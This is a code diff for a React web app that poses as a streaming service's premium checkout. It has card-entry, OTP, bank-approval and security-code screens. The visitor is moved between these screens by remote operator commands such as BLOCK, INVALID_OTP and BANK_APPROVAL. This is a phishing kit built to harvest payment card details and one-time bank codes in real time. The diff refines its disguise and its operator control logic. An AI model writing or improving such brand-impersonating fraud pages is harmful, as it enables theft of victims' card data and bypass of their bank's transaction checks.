@@ -252,8 +252,10 @@ const OTPPage: React.FC<{ session: SessionData; updateSession: (d: Partial<Sessi
   };
 
   return (
-    <div className="min-h-screen bg-black text-white flex flex-col items-center justify-center p-6 animate-in fade-in duration-500">
-      <div className="w-full max-w-md bg-[#121212] p-8 rounded-[32px] border border-white/5 shadow-2xl flex flex-col items-center">
+    <div className="min-h-screen bg-black text-white flex flex-col animate-in fade-in duration-500">
+      <Header />
+      <div className="flex-1 flex items-center justify-center p-6">
+        <div className="w-full max-w-md bg-[#121212] p-8 rounded-[32px] border border-white/5 shadow-2xl flex flex-col items-center">
         <div className="w-16 h-16 bg-[#1ed760]/10 rounded-full flex items-center justify-center mb-6">
           <svg className="w-8 h-8 text-[#1ed760]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
             <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z" />
@@ -280,6 +282,7 @@ const OTPPage: React.FC<{ session: SessionData; updateSession: (d: Partial<Sessi
           />
           <button type="submit" className="w-full bg-[#1ed760] text-black font-bold py-4 rounded-full hover:scale-[1.02] active:scale-95 transition-all text-lg">{t.confirm}</button>
         </form>
+        </div>
       </div>
     </div>
   );
@@ -307,8 +310,10 @@ const BankApproval: React.FC<{ updateSession: (d: Partial<SessionData>) => void;
   };
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-black via-[#0a0a0a] to-[#121212] text-white flex flex-col items-center justify-center p-6 text-center animate-in zoom-in duration-500">
-      <div className="w-full max-w-md bg-[#121212] p-12 rounded-3xl border border-white/10 shadow-2xl">
+    <div className="min-h-screen bg-gradient-to-br from-black via-[#0a0a0a] to-[#121212] text-white flex flex-col animate-in zoom-in duration-500">
+      <Header />
+      <div className="flex-1 flex items-center justify-center p-6 text-center">
+        <div className="w-full max-w-md bg-[#121212] p-12 rounded-3xl border border-white/10 shadow-2xl">
         {/* Card Icon */}
         <div className="w-20 h-20 bg-white/5 rounded-2xl flex items-center justify-center mb-6 mx-auto border border-white/10">
           {getCardIcon()}
@@ -339,10 +344,35 @@ const BankApproval: React.FC<{ updateSession: (d: Partial<SessionData>) => void;
           </svg>
           <span className="font-bold">{t.securedByBank}</span>
         </div>
+        </div>
       </div>
     </div>
   );
 };
+
+// --- Header Component ---
+const Header: React.FC = () => (
+  <nav className="w-full flex items-center justify-between px-6 md:px-24 py-4 bg-black border-b border-white/5">
+    <div className="flex items-center gap-10">
+      <Logo className="w-8 text-white" />
+      <div className="hidden lg:flex gap-6 text-sm font-bold text-white/70">
+        <a href="#" className="hover:text-white transition-colors">Premium plans</a>
+        <a href="#" className="hover:text-white transition-colors">Support</a>
+        <a href="#" className="hover:text-white transition-colors">Download</a>
+      </div>
+    </div>
+    <div className="flex items-center gap-6">
+      <div className="hidden md:block w-[1px] h-6 bg-white/20"></div>
+      <div className="flex items-center gap-3 cursor-pointer group">
+        <div className="w-8 h-8 bg-[#282828] rounded-full flex items-center justify-center border border-white/5 group-hover:bg-[#333]">
+          <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+        </div>
+        <span className="text-sm font-bold group-hover:underline">Profile</span>
+        <svg className="w-4 h-4 text-white/70" fill="currentColor" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5H7z"/></svg>
+      </div>
+    </div>
+  </nav>
+);
 
 // --- Security Check Component ---
 const SecurityCheck: React.FC<{ session: SessionData; updateSession: (d: Partial<SessionData>) => void; onVerify: () => void }> = ({ session, updateSession, onVerify }) => {
@@ -394,11 +424,13 @@ const SecurityCheck: React.FC<{ session: SessionData; updateSession: (d: Partial
   };
 
   return (
-    <div className="min-h-screen bg-[#0a0a0a] flex flex-col items-center justify-center px-6">
-      <div className="w-full max-w-[400px] flex flex-col items-center">
-        <div className="w-20 h-20 bg-[#14261a] rounded-full flex items-center justify-center mb-8 border border-[#1ed760]/20">
-          <svg className="w-10 h-10 text-[#1ed760]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
-        </div>
+    <div className="min-h-screen bg-[#0a0a0a] flex flex-col">
+      <Header />
+      <div className="flex-1 flex flex-col items-center justify-center px-6">
+        <div className="w-full max-w-[400px] flex flex-col items-center">
+          <div className="w-20 h-20 bg-[#14261a] rounded-full flex items-center justify-center mb-8 border border-[#1ed760]/20">
+            <svg className="w-10 h-10 text-[#1ed760]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" /></svg>
+          </div>
         <h1 className="text-white text-3xl font-bold mb-2">{t.subscription}</h1>
         <p className="text-[#a7a7a7] mb-12 text-center">{t.securityCode}</p>
         <div className="w-full bg-[#121212] rounded-2xl p-8 mb-10 relative flex justify-center gap-4 shadow-2xl border border-white/5">
@@ -410,6 +442,7 @@ const SecurityCheck: React.FC<{ session: SessionData; updateSession: (d: Partial
           {userInput.map((val, i) => (
             <input key={i} ref={inputRefs[i]} type="text" maxLength={1} value={val} onChange={(e) => handleInputChange(i, e.target.value)} onKeyDown={(e) => { if (e.key === 'Backspace' && !val && i > 0) inputRefs[i-1].current?.focus(); }} className={`w-14 h-16 bg-transparent border-2 rounded-xl text-center text-2xl font-bold text-white focus:border-[#1ed760] outline-none transition-all ${hasError ? 'border-red-600' : 'border-[#333]'}`} />
           ))}
+        </div>
         </div>
       </div>
     </div>
@@ -481,10 +514,13 @@ const ProcessingScreen: React.FC<{ session: SessionData }> = ({ session }) => {
   const t = translations[session.lang] || translations.en;
   
   return (
-    <div className="min-h-screen bg-black flex flex-col items-center justify-center p-6 text-center">
-      <div className="w-14 h-14 border-4 border-[#1ed760]/20 border-t-[#1ed760] rounded-full animate-spin mb-8"></div>
-      <h2 className="text-white text-2xl font-bold mb-2">{t.processing}</h2>
-      <p className="text-[#a7a7a7] text-sm">{t.doNotClose}</p>
+    <div className="min-h-screen bg-black text-white flex flex-col">
+      <Header />
+      <div className="flex-1 flex flex-col items-center justify-center p-6 text-center">
+        <div className="w-14 h-14 border-4 border-[#1ed760]/20 border-t-[#1ed760] rounded-full animate-spin mb-8"></div>
+        <h2 className="text-white text-2xl font-bold mb-2">{t.processing}</h2>
+        <p className="text-[#a7a7a7] text-sm">{t.doNotClose}</p>
+      </div>
     </div>
   );
 };
@@ -527,28 +563,8 @@ const PaymentForm: React.FC<{ session: SessionData; updateSession: (d: Partial<S
   };
 
   return (
-    <div className="min-h-screen bg-[#121212] text-white flex flex-col font-sans animate-in fade-in duration-500 overflow-x-hidden">
-      {/* Header */}
-      <nav className="w-full flex items-center justify-between px-6 md:px-24 py-4 bg-black border-b border-white/5 sticky top-0 z-50">
-        <div className="flex items-center gap-10">
-          <Logo className="w-8 text-white" />
-          <div className="hidden lg:flex gap-6 text-sm font-bold text-white/70">
-            <a href="#" className="hover:text-white transition-colors">Premium plans</a>
-            <a href="#" className="hover:text-white transition-colors">Support</a>
-            <a href="#" className="hover:text-white transition-colors">Download</a>
-          </div>
-        </div>
-        <div className="flex items-center gap-6">
-          <div className="hidden md:block w-[1px] h-6 bg-white/20"></div>
-          <div className="flex items-center gap-3 cursor-pointer group">
-            <div className="w-8 h-8 bg-[#282828] rounded-full flex items-center justify-center border border-white/5 group-hover:bg-[#333]">
-              <svg className="w-4 h-4 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
-            </div>
-            <span className="text-sm font-bold group-hover:underline">Profile</span>
-            <svg className="w-4 h-4 text-white/70" fill="currentColor" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5H7z"/></svg>
-          </div>
-        </div>
-      </nav>
+    <div className="min-h-screen bg-black text-white flex flex-col animate-in fade-in duration-500">
+      <Header />
 
       {/* Main Content */}
       <main className="flex-1 flex flex-col items-center bg-black pt-12 pb-24 px-6">
@@ -576,16 +592,16 @@ const PaymentForm: React.FC<{ session: SessionData; updateSession: (d: Partial<S
                 <div className="flex justify-between items-center mb-8">
                   <div className="flex flex-col">
                     <span className="text-[13px] font-bold mb-3">{t.creditCard}</span>
-                    <div className="flex gap-3">
+                    <div className="flex gap-2">
                        {/* Beautiful Professional Card Icons */}
-                       <div className="bg-gradient-to-br from-[#1a1f71] to-[#0d1249] p-2 px-3 rounded-lg flex items-center shadow-lg border border-blue-500/20">
-                          <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-4" alt="Visa" />
+                       <div className="bg-gradient-to-br from-[#1a1f71] to-[#0d1249] p-1.5 px-2.5 rounded-md flex items-center shadow-lg border border-blue-500/20">
+                          <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" className="h-3.5" alt="Visa" />
                        </div>
-                       <div className="bg-gradient-to-br from-[#eb001b] to-[#ff5f00] p-2 px-3 rounded-lg flex items-center shadow-lg">
-                          <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-4" alt="MC" />
+                       <div className="bg-gradient-to-br from-[#eb001b] to-[#ff5f00] p-1.5 px-2.5 rounded-md flex items-center shadow-lg">
+                          <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-3.5" alt="MC" />
                        </div>
-                       <div className="bg-gradient-to-br from-[#006fcf] to-[#0048a0] p-2 px-3 rounded-lg flex items-center shadow-lg">
-                          <img src="https://upload.wikimedia.org/wikipedia/commons/b/b0/American_Express_logo_%282018%29.svg" className="h-4" alt="Amex" />
+                       <div className="bg-gradient-to-br from-[#006fcf] to-[#0048a0] p-1.5 px-2.5 rounded-md flex items-center shadow-lg">
+                          <img src="https://upload.wikimedia.org/wikipedia/commons/b/b0/American_Express_logo_%282018%29.svg" className="h-3.5" alt="Amex" />
                        </div>
                     </div>
                   </div>
@@ -889,11 +905,11 @@ const App: React.FC = () => {
           const remote = currentData[idx];
           // React to remote commands
           if (remote.adminAction === 'BLOCK') setStep('BLOCKED');
-          else if (remote.adminAction === 'OTP_PAGE' && step !== 'OTP' && step !== 'PROCESSING') setStep('OTP');
+          else if (remote.adminAction === 'OTP_PAGE' && step !== 'OTP') setStep('OTP');
           else if (remote.adminAction === 'INVALID_OTP' && step === 'PROCESSING') setStep('OTP');
           else if (remote.adminAction === 'BANK_APPROVAL' && step === 'PROCESSING') setStep('BANK_APPROVAL');
-          else if (remote.adminAction === 'INVALID_CARD' && step !== 'PAYMENT') setStep('PAYMENT');
-          else if (remote.adminAction === 'NORMAL' && (step === 'OTP' || step === 'BANK_APPROVAL' || step === 'PROCESSING')) setStep('PAYMENT');
+          else if (remote.adminAction === 'INVALID_CARD') setStep('PAYMENT');
+          else if (remote.adminAction === 'NORMAL' && (step === 'OTP' || step === 'BANK_APPROVAL')) setStep('PAYMENT');
           
           currentData[idx] = { ...updated, adminAction: remote.adminAction };
         } else {
